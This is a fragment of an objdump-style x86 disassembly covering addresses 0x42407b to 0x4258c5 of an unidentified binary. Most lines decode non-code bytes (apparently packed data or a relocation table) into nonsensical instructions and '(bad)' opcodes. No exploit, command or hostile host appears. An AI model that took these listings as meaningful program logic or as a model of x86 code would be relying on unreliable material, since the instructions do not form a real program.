  42407b:	or     ch,BYTE PTR [edi+eiz*8]
  42407e:	and    cl,BYTE PTR es:[ecx+eiz*4+0x10]
  424083:	repnz out dx,al
  424085:	dec    ebx
  424086:	scas   eax,DWORD PTR es:[edi]
  424087:	push   cs
  424088:	sbb    bh,BYTE PTR [esi+0x4b]
  42408b:	popf   
  42408c:	bound  ebp,QWORD PTR [eax]
  42408e:	inc    ebx
  42408f:	popa   
  424090:	sbb    DWORD PTR [edi+0x76108b97],ecx
  424096:	xor    dl,BYTE PTR [esi+ebx*8-0x6a02ae4]
  42409d:	jbe    0x424021
  42409f:	(bad)  [edx]
  4240a1:	fsub   QWORD PTR [esi+eiz*4+0x6c]
  4240a5:	retf   0x55ef
  4240a8:	imul   edi,ebp,0xb98d8d0c
  4240ae:	jmp    0x7b23db47
  4240b3:	jmp    0x1d7e:0x9c9dcef8
  4240ba:	sub    eax,0x7d4d73e5
  4240bf:	pop    edx
  4240c0:	push   cs
  4240c1:	test   eax,0x20b2a007
  4240c6:	mov    eax,ebx
  4240c8:	loop   0x42406b
  4240ca:	int3   
  4240cb:	or     ebx,DWORD PTR [edx-0x42]
  4240ce:	sub    eax,0x51cb6984
  4240d3:	or     DWORD PTR [ecx+eiz*1-0x530e2a74],ebx
  4240da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240db:	mov    ch,0x35
  4240dd:	aaa    
  4240de:	xor    eax,0xb6a3cf82
  4240e3:	addr16 sbb ah,bl
  4240e6:	sub    BYTE PTR [ecx-0x19f89abd],al
  4240ec:	adc    BYTE PTR ds:0x32ab0e1c,ah
  4240f2:	mov    DWORD PTR [esi],eax
  4240f4:	sub    BYTE PTR [esi+0x51],0x67
  4240f8:	dec    ebx
  4240f9:	cmp    dl,BYTE PTR [edx]
  4240fb:	ins    DWORD PTR es:[edi],dx
  4240fc:	jb     0x4240e4
  4240fe:	jns    0x42417b
  424100:	jno    0x42411a
  424102:	sar    DWORD PTR [esi],cl
  424104:	jnp    0x424140
  424106:	dec    esp
  424107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424108:	xchg   ebp,eax
  424109:	scas   eax,DWORD PTR es:[edi]
  42410a:	sahf   
  42410b:	jmp    0x4240c5
  42410d:	cdq    
  42410e:	xchg   ebx,eax
  42410f:	or     BYTE PTR [edi+0x50778dd1],dl
  424115:	or     eax,0xb04c95b6
  42411a:	repnz xor DWORD PTR [edi+esi*2],edi
  42411e:	cmc    
  42411f:	loop   0x424166
  424121:	pop    ds
  424122:	addr16 mov ch,0x22
  424125:	rcr    DWORD PTR [esi],0x27
  424128:	ss stos BYTE PTR es:[edi],al
  42412a:	aaa    
  42412b:	push   ebx
  42412c:	jo     0x4240b2
  42412e:	test   edx,eax
  424130:	loopne 0x42418b
  424132:	in     al,dx
  424133:	add    eax,0x880e4a74
  424138:	sti    
  424139:	sub    eax,0x204a8598
  42413e:	fbstp  TBYTE PTR [edi]
  424140:	and    edx,esp
  424142:	add    eax,0xe4a86c6b
  424147:	push   ebp
  424148:	(bad)  
  42414a:	jbe    0x424184
  42414c:	mov    ebx,fs
  42414e:	pushf  
  42414f:	mov    al,0x2
  424151:	in     eax,dx
  424152:	sub    DWORD PTR [esi-0x1b],esi
  424155:	mov    ebx,0x4865799d
  42415a:	and    al,al
  42415c:	aaa    
  42415d:	sub    ah,BYTE PTR [edi-0x30]
  424160:	aad    0xda
  424162:	scas   eax,DWORD PTR es:[edi]
  424163:	mov    ebx,0xcf5d046f
  424168:	dec    cl
  42416a:	jmp    0x42419c
  42416c:	push   ecx
  42416d:	xchg   DWORD PTR [ebx+0x26f1d8a6],edx
  424173:	xchg   esp,eax
  424174:	pop    ss
  424175:	fcom   QWORD PTR [ebx-0x6f42801c]
  42417b:	pushf  
  42417c:	(bad)  
  42417d:	pop    esi
  42417e:	mov    eax,ds:0x9ce349ef
  424183:	aad    0x72
  424185:	fnstenv [ecx-0x400ca50]
  42418b:	mov    ds:0x90fe991e,eax
  424190:	xchg   BYTE PTR [eax],ch
  424192:	cmp    DWORD PTR [ecx+0x5480456f],0x2a
  424199:	fldcw  WORD PTR [edx+0x75360602]
  42419f:	pop    es
  4241a0:	dec    edi
  4241a1:	fsub   DWORD PTR ds:0xc5348616
  4241a7:	popf   
  4241a8:	mov    bh,0x4e
  4241aa:	(bad)  
  4241ab:	xlat   BYTE PTR ss:[ebx]
  4241ad:	cmp    al,0x75
  4241af:	std    
  4241b0:	dec    edx
  4241b1:	aas    
  4241b2:	lds    ebx,FWORD PTR [ebp-0xfb1eb7e]
  4241b8:	out    0xa6,eax
  4241ba:	mov    ebp,DWORD PTR es:[ebp+eiz*4+0x72588e0b]
  4241c2:	loopne 0x42416a
  4241c4:	repnz sub BYTE PTR [eax+0x63],bh
  4241c8:	popf   
  4241c9:	inc    esp
  4241ca:	ins    BYTE PTR es:[edi],dx
  4241cb:	or     BYTE PTR [edi],0xb5
  4241ce:	adc    esi,eax
  4241d0:	mov    eax,0x2d5e2
  4241d5:	inc    eax
  4241d6:	dec    esi
  4241d7:	pop    ebp
  4241d8:	iret   
  4241d9:	jle    0x424245
  4241db:	int3   
  4241dc:	push   cs
  4241dd:	and    DWORD PTR [edx-0x15ef113e],0xffffffbc
  4241e4:	outs   dx,DWORD PTR ds:[esi]
  4241e5:	mov    edx,0x1324f71c
  4241ea:	add    eax,0x5e683c2d
  4241ef:	jmp    0x7ba8:0xb823c370
  4241f6:	adc    eax,0xcaf6cd4a
  4241fb:	mov    cl,0x5b
  4241fd:	add    ch,BYTE PTR [edi+eiz*1]
  424200:	sbb    al,0x50
  424202:	in     eax,dx
  424203:	scas   al,BYTE PTR es:[edi]
  424204:	loopne 0x4241f2
  424206:	push   ds
  424207:	jmp    0x4199339e
  42420c:	(bad)  
  42420d:	pop    ds
  42420e:	call   0xccc9086e
  424213:	in     eax,0x66
  424215:	test   bh,ch
  424217:	arpl   bx,cx
  424219:	int    0x4b
  42421b:	or     ebx,edx
  42421d:	sub    ebp,DWORD PTR [ecx-0x67]
  424220:	sub    al,0x2a
  424222:	push   0x1f1e064
  424227:	imul   ebp,DWORD PTR [ebp+0x36],0xffbc3747
  42422e:	scas   al,BYTE PTR es:[edi]
  42422f:	cmp    BYTE PTR [ecx+0x19574a],dl
  424235:	jne    0x42421a
  424237:	mov    edx,0xb195b9ef
  42423c:	inc    esp
  42423d:	lods   al,BYTE PTR ds:[esi]
  42423e:	mov    eax,0x44140a54
  424243:	push   ebx
  424244:	(bad)  
  424245:	(bad)  
  424246:	jl     0x424264
  424248:	add    eax,esi
  42424a:	xchg   edi,eax
  42424b:	jo     0x424212
  42424d:	pop    ds
  42424e:	mov    bl,0xd7
  424250:	in     al,0x1c
  424252:	and    DWORD PTR ds:0x9c6a8e9e,edi
  424258:	arpl   ax,ax
  42425a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42425b:	ret    
  42425c:	push   ds
  42425d:	std    
  42425e:	mov    edi,0x6d8ec90
  424263:	(bad)  [edi-0x62]
  424266:	dec    esp
  424267:	xchg   ebp,eax
  424268:	xchg   ecx,eax
  424269:	xchg   ebp,eax
  42426a:	add    BYTE PTR [esi+0x693de2f3],ch
  424270:	fsub   QWORD PTR [eax-0x3da48b3]
  424276:	lds    edi,FWORD PTR [ecx+0x60]
  424279:	or     BYTE PTR [ebx+0x225fd7a9],ah
  42427f:	push   esi
  424280:	xchg   ebx,eax
  424281:	jmp    0xbd70:0xd375064e
  424288:	cmp    eax,0x370a4c41
  42428d:	call   0x2f1b:0xe88a4abf
  424294:	mov    bh,0x35
  424296:	cld    
  424297:	push   esp
  424298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424299:	(bad)  
  42429a:	cli    
  42429b:	mov    WORD PTR [edi+0x43],fs
  42429e:	fisubr DWORD PTR [edx+0x65]
  4242a1:	std    
  4242a2:	xchg   esp,eax
  4242a3:	dec    ebp
  4242a4:	jo     0x42427f
  4242a6:	jl     0x4242d7
  4242a8:	or     BYTE PTR [ecx-0x32709618],al
  4242ae:	add    eax,0xbec68272
  4242b3:	retf   0xc3ef
  4242b6:	shl    BYTE PTR [edx],cl
  4242b8:	call   0x84962c03
  4242bd:	xchg   ebp,eax
  4242be:	lahf   
  4242bf:	or     al,0xae
  4242c1:	and    al,0x56
  4242c3:	jl     0x4242e6
  4242c5:	inc    ebx
  4242c6:	mul    ah
  4242c8:	shl    ebx,0x7c
  4242cb:	sbb    DWORD PTR [edi-0x48a2f321],ebp
  4242d1:	sar    al,cl
  4242d3:	loopne 0x424269
  4242d5:	jg     0x4242f1
  4242d7:	xchg   DWORD PTR [esi+edi*1-0x4f],esp
  4242db:	and    al,0xd
  4242dd:	mov    esp,0xa675bc89
  4242e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4242e3:	pushf  
  4242e4:	mov    esi,0x625d302b
  4242e9:	stos   DWORD PTR es:[edi],eax
  4242ea:	iret   
  4242eb:	sub    BYTE PTR [esi-0x18],bl
  4242ee:	sbb    ah,BYTE PTR [edx-0x74]
  4242f1:	sti    
  4242f2:	push   edx
  4242f3:	stos   DWORD PTR es:[edi],eax
  4242f4:	arpl   bp,bx
  4242f6:	lds    eax,FWORD PTR ds:0xec1cc6bb
  4242fc:	sub    bh,BYTE PTR [ebp*8-0x2c8e2fbc]
  424303:	cmp    eax,DWORD PTR [ecx]
  424305:	scas   al,BYTE PTR es:[edi]
  424306:	cs out 0x2d,eax
  424309:	xchg   esp,edi
  42430b:	das    
  42430c:	(bad)
  42430f:	(bad)  
  424310:	icebp  
  424311:	push   eax
  424312:	js     0x424369
  424314:	pop    esi
  424315:	sbb    al,dl
  424317:	lods   al,BYTE PTR ds:[esi]
  424318:	pop    ss
  424319:	or     dh,BYTE PTR [esi-0x5a]
  42431c:	loope  0x4242e3
  42431e:	mov    esp,0x38d3aaec
  424323:	jge    0x424369
  424325:	cmp    ah,BYTE PTR [edx-0x7a]
  424328:	fistp  WORD PTR [eax+ebp*2]
  42432b:	mov    eax,ds:0xbac4a5d5
  424330:	jns    0x424341
  424332:	inc    esi
  424333:	and    BYTE PTR [esi+0x63],al
  424336:	adc    dl,cl
  424338:	mov    ebp,0xce8f8634
  42433d:	mov    esp,DWORD PTR [ebp-0x639f274f]
  424343:	pop    eax
  424344:	sahf   
  424345:	mov    ebp,0x44208dab
  42434a:	cwde   
  42434b:	adc    ch,BYTE PTR [esi+0x67]
  42434e:	stos   BYTE PTR es:[edi],al
  42434f:	xchg   edx,eax
  424350:	out    0xab,al
  424352:	call   0x3a560122
  424357:	mov    BYTE PTR [edx],cl
  424359:	call   ebp
  42435b:	xor    DWORD PTR [edi],eax
  42435d:	jge    0x42432b
  42435f:	dec    ecx
  424360:	js     0x424353
  424362:	(bad)
  424366:	pushf  
  424367:	push   ebx
  424368:	xchg   esi,eax
  42436a:	lods   eax,DWORD PTR ds:[esi]
  42436b:	stc    
  42436c:	mov    al,0xad
  42436e:	ja     0x4243c9
  424370:	shl    eax,0x21
  424373:	(bad)  
  424374:	mov    ch,0x8d
  424376:	adc    eax,0x7f403758
  42437b:	sub    bh,ch
  42437d:	ja     0x424365
  42437f:	pop    esp
  424380:	xor    edi,DWORD PTR [ebp+0x46]
  424383:	das    
  424384:	int3   
  424385:	call   0xeb5b:0x18904bcd
  42438c:	mov    ecx,0x4ff5ff2
  424391:	jns    0x424393
  424393:	mov    ebx,0x6a99f649
  424398:	mov    esi,0xeb4699b0
  42439d:	outs   dx,BYTE PTR ds:[esi]
  42439e:	inc    BYTE PTR [edi+0x3b4c06ea]
  4243a4:	add    al,0x61
  4243a6:	nop
  4243a7:	dec    ecx
  4243a8:	rcl    BYTE PTR [esi-0x54585221],cl
  4243ae:	fs push 0xfffffff0
  4243b1:	das    
  4243b2:	push   eax
  4243b3:	mov    esi,DWORD PTR [eax+ebx*1+0x40288cc4]
  4243ba:	mov    DWORD PTR [edx-0xa],esp
  4243bd:	cdq    
  4243be:	ins    BYTE PTR es:[edi],dx
  4243bf:	xchg   DWORD PTR [ecx-0x33],ebp
  4243c2:	and    edx,ecx
  4243c4:	int    0x9c
  4243c6:	push   es
  4243c7:	in     eax,0x1a
  4243c9:	jle    0x4243fe
  4243cb:	je     0x424405
  4243cd:	retf   
  4243ce:	push   es
  4243cf:	mov    dl,0xc8
  4243d1:	fidivr DWORD PTR [esi+eax*2+0x69b962db]
  4243d8:	mov    ecx,0x4e7824a9
  4243dd:	sbb    eax,0xae735c05
  4243e2:	cmp    DWORD PTR [ebx],edx
  4243e4:	cmp    al,0x62
  4243e6:	cld    
  4243e7:	mov    ss,WORD PTR [edi+0x5c465fc1]
  4243ed:	dec    ecx
  4243ee:	fs cmc 
  4243f0:	pusha  
  4243f1:	lods   al,BYTE PTR ds:[esi]
  4243f2:	into   
  4243f3:	xor    DWORD PTR [ebx+0x2669e74e],ebx
  4243f9:	add    ebp,DWORD PTR [ebp-0x7d]
  4243fc:	in     eax,0x87
  4243fe:	sahf   
  4243ff:	inc    ebp
  424400:	mov    eax,0x9d708218
  424405:	pop    ecx
  424406:	out    0x39,eax
  424408:	jnp    0x42439c
  42440a:	pop    edi
  42440b:	leave  
  42440c:	clc    
  42440d:	jg     0x4243d9
  42440f:	test   al,0x86
  424411:	mov    eax,0x1dac88ce
  424416:	call   0xe31c00ec
  42441b:	cs push ecx
  42441d:	int3   
  42441e:	xchg   DWORD PTR [ebp+0xa],edx
  424421:	add    ah,BYTE PTR [edi+ebx*1]
  424424:	xor    eax,edx
  424426:	test   DWORD PTR [edi+0x10b8ff3b],edi
  42442c:	loop   0x424466
  42442e:	aad    0xc7
  424430:	sar    DWORD PTR [edx],0xc9
  424433:	jl     0x42447a
  424435:	mov    ebp,0x98613579
  42443a:	xor    bl,BYTE PTR [edx+0x3e31bb0d]
  424440:	rol    BYTE PTR [edx+0x48],0xc4
  424444:	arpl   WORD PTR [esp+edi*4+0x2c],bp
  424448:	ja     0x42444c
  42444a:	xor    edi,ecx
  42444c:	cwde   
  42444d:	fld    DWORD PTR [eax+edx*8-0x3832db72]
  424454:	je     0x42440d
  424456:	repz mov ah,dl
  424459:	test   BYTE PTR [ebp-0x58ba5d8b],0xba
  424460:	jp     0x4244db
  424462:	es cld 
  424464:	pusha  
  424465:	enter  0x2910,0x8
  424469:	add    al,0x91
  42446b:	out    0xe0,eax
  42446d:	iret   
  42446e:	int    0x1
  424470:	mov    esi,0x168dc3ba
  424475:	pop    edi
  424476:	push   0x43a6c4af
  42447b:	pop    ebx
  42447c:	clc    
  42447d:	or     DWORD PTR [ebx+ebx*2+0x7d511b0d],0x16
  424485:	xor    edx,DWORD PTR [edi+0x37622d9d]
  42448b:	add    DWORD PTR [ecx-0x4a1cbad7],eax
  424491:	mov    ebp,0xb5b892c2
  424496:	dec    ebx
  424497:	jecxz  0x42450b
  424499:	pop    ecx
  42449a:	sbb    esi,DWORD PTR [eax+edi*8]
  42449d:	mov    cl,0x5f
  42449f:	scas   al,BYTE PTR es:[edi]
  4244a0:	xchg   ecx,eax
  4244a1:	xchg   ah,al
  4244a3:	jno    0x424503
  4244a5:	out    0xe6,eax
  4244a7:	inc    esp
  4244a8:	xchg   esi,eax
  4244a9:	fsub   DWORD PTR [ecx+0x5e]
  4244ac:	sub    al,BYTE PTR [ebp+0x7]
  4244af:	aas    
  4244b0:	adc    ebp,DWORD PTR [edx-0x5733034f]
  4244b6:	leave  
  4244b7:	loopne 0x42452f
  4244b9:	je     0x424483
  4244bb:	cmp    esi,DWORD PTR [esi]
  4244bd:	xchg   ecx,eax
  4244be:	add    ah,0xce
  4244c1:	fwait
  4244c2:	cli    
  4244c3:	xchg   DWORD PTR [ebp+ebx*2-0x6c],edi
  4244c7:	dec    ebx
  4244c8:	rcr    BYTE PTR [ebx+0x77],1
  4244cb:	pop    edx
  4244cc:	adc    ecx,edx
  4244ce:	pop    ebp
  4244cf:	in     al,0xdb
  4244d1:	idiv   BYTE PTR [eax]
  4244d3:	adc    dh,BYTE PTR [esi+0x43]
  4244d6:	imul   ebx,DWORD PTR [ebx],0x41
  4244d9:	rcr    BYTE PTR [edx+eax*8-0x67],cl
  4244dd:	dec    esp
  4244de:	inc    ebx
  4244df:	dec    ebx
  4244e0:	and    esi,DWORD PTR [ecx+0x537c9c92]
  4244e6:	or     ah,BYTE PTR [esi+0x28]
  4244e9:	jmp    0x42453c
  4244eb:	and    bl,cl
  4244ed:	add    eax,0xff28e20a
  4244f2:	stos   BYTE PTR es:[edi],al
  4244f3:	jnp    0x424573
  4244f5:	jp     0x424516
  4244f7:	es ret 
  4244f9:	add    ebx,edx
  4244fb:	xchg   al,ch
  4244fd:	push   ecx
  4244fe:	sbb    eax,0x58697ddb
  424503:	pusha  
  424504:	aaa    
  424505:	jae    0x4244a0
  424507:	or     al,0xe1
  424509:	fwait
  42450a:	(bad)  
  42450b:	call   0xa0aceb25
  424510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424511:	and    ecx,DWORD PTR [edx]
  424513:	and    DWORD PTR [ebx+edx*8],ecx
  424516:	adc    BYTE PTR [ebx-0x2ca975e2],dh
  42451c:	das    
  42451d:	arpl   WORD PTR [ecx+0x7f7132e7],bx
  424523:	and    DWORD PTR [eax+edi*8+0x41],eax
  424527:	and    al,BYTE PTR [edx+ebp*1]
  42452a:	call   0x999870b5
  42452f:	cmp    al,0x14
  424531:	nop
  424532:	push   eax
  424533:	cmp    BYTE PTR [ecx+0x4c43d85b],bl
  424539:	arpl   dx,di
  42453b:	leave  
  42453c:	add    DWORD PTR [edx-0x3c],edx
  42453f:	cmp    BYTE PTR [ebx+ecx*2+0x8],cl
  424543:	rol    ebp,1
  424545:	push   0xc9cc190c
  42454a:	mov    dl,0xab
  42454c:	mov    ds:0x382c39c9,al
  424551:	cmp    DWORD PTR [edx+0x1b],esi
  424554:	add    eax,DWORD PTR [edi]
  424556:	push   edi
  424557:	in     al,dx
  424558:	jmp    0xd9668605
  42455d:	mov    DWORD PTR [ecx],esp
  42455f:	sbb    DWORD PTR [eax+0x50b0a73b],eax
  424565:	cmp    ch,bl
  424567:	xchg   ebx,eax
  424568:	cmp    DWORD PTR [edx+0x2a7a6a58],ebp
  42456e:	or     al,0xc7
  424570:	mov    al,bl
  424572:	fcom   DWORD PTR ds:0x279b326f
  424578:	dec    esi
  424579:	neg    DWORD PTR [ebp+0x4e4ae62a]
  42457f:	(bad)  
  424581:	sar    BYTE PTR [ebp+ebx*1+0x3799d232],cl
  424588:	outs   dx,DWORD PTR ds:[esi]
  424589:	push   ebx
  42458a:	cmp    eax,0xb0a5989d
  42458f:	mov    bl,0xe2
  424591:	int    0x53
  424593:	dec    ecx
  424594:	sbb    bl,BYTE PTR [ecx-0x7271e3d2]
  42459a:	jge    0x424563
  42459c:	dec    ebx
  42459d:	scas   al,BYTE PTR es:[edi]
  42459e:	fiadd  WORD PTR [eax+eiz*4-0x40]
  4245a2:	sbb    edi,DWORD PTR [ecx-0x40]
  4245a5:	retf   
  4245a6:	out    dx,al
  4245a7:	xchg   dl,bh
  4245a9:	mov    ds:0xe66fb471,eax
  4245ae:	mov    edi,0xbbfa943
  4245b3:	xchg   edi,eax
  4245b4:	push   0x859ee366
  4245b9:	mov    dh,0x89
  4245bb:	loope  0x424632
  4245bd:	xchg   edx,eax
  4245be:	mov    ah,bh
  4245c0:	push   eax
  4245c1:	aas    
  4245c2:	push   ebp
  4245c3:	adc    eax,DWORD PTR [edx+0x6d080331]
  4245c9:	fidivr WORD PTR [ecx-0x5f]
  4245cc:	in     eax,0xc0
  4245ce:	jge    0x4245ed
  4245d0:	mov    esp,0x5f551031
  4245d5:	mov    al,ds:0xb6e3fdf2
  4245da:	nop
  4245db:	add    ecx,DWORD PTR [ecx-0x5d]
  4245de:	and    al,0xbc
  4245e0:	inc    ebp
  4245e1:	mov    esp,0x4f5c4c19
  4245e6:	dec    esp
  4245e7:	xor    DWORD PTR [edi+0x46],ecx
  4245ea:	push   ss
  4245eb:	icebp  
  4245ec:	xchg   esp,eax
  4245ed:	xchg   esp,eax
  4245ee:	sub    cl,cl
  4245f0:	mov    ds:0xbd36201c,al
  4245f5:	sub    al,0x24
  4245f7:	leave  
  4245f8:	inc    esp
  4245f9:	aaa    
  4245fa:	mov    ebx,0x2c90af29
  4245ff:	fnstcw WORD PTR [edx+0x62]
  424602:	mov    ds:0x8e3d3387,eax
  424607:	scas   eax,DWORD PTR es:[edi]
  424608:	xchg   esp,eax
  424609:	inc    eax
  42460a:	xchg   DWORD PTR [eax],esp
  42460c:	out    0xf,eax
  42460e:	inc    edi
  42460f:	loope  0x424609
  424611:	or     DWORD PTR [eax],ebp
  424613:	add    al,0xb0
  424615:	rol    BYTE PTR [ebx],1
  424617:	dec    esp
  424618:	xchg   edi,eax
  424619:	dec    esp
  42461a:	adc    DWORD PTR [eax+edx*4-0x4],eax
  42461e:	xchg   ecx,eax
  42461f:	hlt    
  424620:	mov    ah,bh
  424622:	out    0x47,eax
  424624:	fwait
  424625:	mov    edx,0x2eb5d2fb
  42462a:	mov    dl,0x54
  42462c:	push   esi
  42462d:	xor    DWORD PTR [edx],esp
  42462f:	ds pop ecx
  424631:	mov    BYTE PTR [edx],bl
  424633:	sahf   
  424634:	test   eax,0xe7f57e53
  424639:	mov    bh,0xce
  42463b:	jecxz  0x424628
  42463d:	xchg   ebp,eax
  42463e:	push   ebp
  42463f:	scas   al,BYTE PTR es:[edi]
  424640:	mov    BYTE PTR [ecx],bh
  424642:	jmp    0x2564:0xab04fb0b
  424649:	fwait
  42464a:	mov    cl,0xab
  42464c:	inc    ebx
  42464d:	or     eax,0xa1b14e4a
  424652:	pop    esi
  424653:	push   ds
  424654:	inc    ecx
  424655:	dec    esp
  424656:	sub    bh,BYTE PTR [ecx]
  424658:	xor    eax,0xad7993d9
  42465d:	lock and eax,0x662d3390
  424663:	sub    al,0x34
  424665:	add    cl,dh
  424667:	fstp   DWORD PTR [ecx+0x79]
  42466a:	xchg   edx,eax
  42466b:	pop    ebx
  42466c:	ins    BYTE PTR es:[edi],dx
  42466d:	pop    eax
  42466e:	lds    edx,FWORD PTR [ecx-0xa]
  424671:	push   0xfd8e2944
  424676:	jb     0x4246be
  424678:	clc    
  424679:	push   eax
  42467a:	lds    esi,FWORD PTR [ecx+0x5ed94823]
  424680:	sbb    al,0x8b
  424682:	in     al,0x60
  424684:	shl    edx,1
  424686:	jp     0x4246fe
  424688:	or     al,0x88
  42468a:	xchg   esp,eax
  42468b:	data16 lods al,BYTE PTR ds:[esi]
  42468d:	mov    dl,0x1f
  42468f:	sbb    ecx,DWORD PTR [esi+0x2d5a17a3]
  424695:	adc    ch,BYTE PTR [ebx+0x3a]
  424698:	jecxz  0x424645
  42469a:	sub    eax,0x92d8b39e
  42469f:	sbb    dl,dh
  4246a1:	adc    eax,0xbd4387ab
  4246a6:	nop
  4246a7:	jmp    0xbea68bea
  4246ac:	mov    eax,0x366a006a
  4246b1:	inc    esp
  4246b2:	lea    edi,[esi]
  4246b4:	xchg   ebx,eax
  4246b5:	js     0x424678
  4246b7:	sbb    dh,cl
  4246b9:	dec    BYTE PTR [edi]
  4246bb:	jge    0x4246e3
  4246bd:	call   0x3c46b8f8
  4246c2:	xchg   DWORD PTR [edi-0x7c312c95],ecx
  4246c8:	mov    al,0x8b
  4246ca:	cmc    
  4246cb:	int    0x56
  4246cd:	pop    edx
  4246ce:	loopne 0x424726
  4246d0:	(bad)  
  4246d2:	fisttp WORD PTR [ecx-0x5223c2ee]
  4246d8:	ja     0x424695
  4246da:	ins    DWORD PTR es:[edi],dx
  4246db:	mov    esi,0x0
	...
  424724:	add    BYTE PTR [eax],al
  424726:	cwde   
  424727:	and    BYTE PTR [eax],dl
  424729:	add    BYTE PTR [eax+0x3],bh
  42472c:	adc    BYTE PTR [eax],al
  42472e:	mov    ebp,0xf600105c
  424733:	push   ebp
  424734:	adc    BYTE PTR [eax],al
  424736:	and    eax,0x3800107b
  42473b:	cmp    DWORD PTR [eax],edx
  42473d:	add    BYTE PTR [ebp+edx*1+0x1e9b0010],cl
  424744:	adc    BYTE PTR [eax],al
	...
  425746:	add    BYTE PTR [eax],dl
  425748:	add    BYTE PTR [eax],al
  42574a:	in     al,dx
  42574b:	add    BYTE PTR [eax],al
  42574d:	add    BYTE PTR [edx],ch
  42574f:	xor    BYTE PTR [eax],dh
  425751:	xor    BYTE PTR ds:0x58304c30,dh
  425757:	xor    BYTE PTR [esi+0x30],bl
  42575a:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  425761:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  425767:	xor    al,al
  425769:	xor    bh,cl
  42576b:	xor    BYTE PTR [edx-0x48ce51cf],ch
  425771:	xor    esp,eax
  425773:	xor    eax,ecx
  425775:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  42577b:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  425781:	xor    edx,ebp
  425783:	xor    ebx,ebp
  425785:	xor    esp,esp
  425787:	xor    ebp,edi
  425789:	xor    edi,ebp
  42578b:	xor    ecx,DWORD PTR [eax]
  42578d:	xor    al,0xc
  42578f:	xor    al,0x14
  425791:	xor    al,0x28
  425793:	xor    al,0x2e
  425795:	xor    al,0x40
  425797:	xor    al,0x46
  425799:	xor    al,0xf8
  42579b:	xor    eax,0x360435fc
  4257a0:	push   cs
  4257a1:	sbb    esi,DWORD PTR ss:[esi]
  4257a4:	sub    esi,DWORD PTR [esi]
  4257a6:	xor    DWORD PTR [esi],esi
  4257a8:	cmp    eax,0x48364336
  4257ad:	ss dec esi
  4257af:	ss pop esp
  4257b1:	ss push 0x7f367b36
  4257b7:	ss pop edi
  4257b9:	aaa    
  4257ba:	imul   esi,DWORD PTR [edi],0x7e
  4257bd:	aaa    
  4257be:	xor    BYTE PTR [edi],0x8d
  4257c1:	aaa    
  4257c2:	call   0xb637:0xb037a937
  4257c9:	aaa    
  4257ca:	ret    
  4257cb:	aaa    
  4257cc:	shl    DWORD PTR [edi],cl
  4257ce:	mov    ah,0x38
  4257d0:	mov    ebp,0xce38ca38
  4257d5:	cmp    dh,dl
  4257d7:	cmp    dl,ah
  4257d9:	cmp    dl,dh
  4257db:	cmp    dh,dh
  4257dd:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  4257e3:	cmp    ah,dl
  4257e5:	cmp    ch,dh
  4257e7:	cmp    dh,ch
  4257e9:	cmp    bh,bl
  4257eb:	cmp    al,BYTE PTR [edi]
  4257ed:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4257f0:	adc    eax,0x2a3b1b3b
  4257f5:	cmp    esi,DWORD PTR [ecx]
  4257f7:	cmp    esi,DWORD PTR [edi]
  4257f9:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  4257fd:	cmp    al,0x34
  4257ff:	cmp    al,0x3e
  425801:	cmp    al,0x44
  425803:	cmp    al,0x49
  425805:	cmp    al,0x52
  425807:	cmp    al,0x5b
  425809:	cmp    al,0x6a
  42580b:	cmp    al,0x71
  42580d:	cmp    al,0x77
  42580f:	cmp    al,0x84
  425811:	cmp    al,0x9d
  425813:	cmp    al,0xa6
  425815:	cmp    al,0xac
  425817:	cmp    al,0xb9
  425819:	cmp    al,0xc0
  42581b:	cmp    al,0xce
  42581d:	cmp    al,0xd7
  42581f:	cmp    al,0xba
  425821:	cmp    eax,0x3dd13dc4
  425826:	loope  0x425865
  425828:	out    0x3d,eax
  42582a:	hlt    
  42582b:	cmp    eax,0x3e013dfb
  425830:	or     BYTE PTR [esi],bh
  425832:	add    BYTE PTR [eax],ah
  425834:	add    BYTE PTR [eax],al
  425836:	dec    eax
  425837:	add    BYTE PTR [eax],al
  425839:	add    BYTE PTR [ebx],bh
  42583b:	cmp    al,0x4c
  42583d:	cmp    al,0x52
  42583f:	cmp    al,0x58
  425841:	cmp    al,0x65
  425843:	cmp    al,0x73
  425845:	cmp    al,0x7f
  425847:	cmp    al,0x85
  425849:	cmp    al,0x94
  42584b:	cmp    al,0x9a
  42584d:	cmp    al,0xa5
  42584f:	cmp    al,0xaf
  425851:	cmp    al,0xb6
  425853:	cmp    al,0xbc
  425855:	cmp    al,0xc8
  425857:	cmp    al,0xd6
  425859:	cmp    al,0xdc
  42585b:	cmp    al,0xe9
  42585d:	cmp    al,0xf0
  42585f:	cmp    al,0xf6
  425861:	cmp    al,0x9
  425863:	cmp    eax,0x3d203d13
  425868:	sub    al,0x3d
  42586a:	xor    DWORD PTR ds:0x3d403d3b,edi
  425870:	inc    ebp
  425871:	cmp    eax,0x3d513d4b
  425876:	pop    eax
  425877:	cmp    eax,0x30000000
  42587c:	add    BYTE PTR [eax],al
  42587e:	or     al,0x1
  425880:	add    BYTE PTR [eax],al
  425882:	push   ebx
  425883:	xor    bl,BYTE PTR [ecx+0x32]
  425886:	xor    ch,BYTE PTR gs:[ebx+0x32]
  42588a:	jae    0x4258be
  42588c:	jns    0x4258c0
  42588e:	test   BYTE PTR [edx],dh
  425890:	mov    BYTE PTR [edx],dh
  425892:	(bad)  
  425893:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  425899:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  42589f:	xor    ah,dh
  4258a1:	xor    ch,dl
  4258a3:	xor    bh,cl
  4258a5:	xor    bh,bh
  4258a7:	xor    ah,BYTE PTR [ecx+0x34]
  4258aa:	addr16 xor al,0x1d
  4258ad:	xor    eax,0x35333529
  4258b2:	cmp    BYTE PTR ds:0x355a3543,dh
  4258b8:	arpl   WORD PTR ds:0x357a356d,si
  4258be:	xchg   BYTE PTR ds:0x3591358b,dh
  4258c4:	xchg   esi,eax
  4258c5:	xor    eax,0x35a7359c
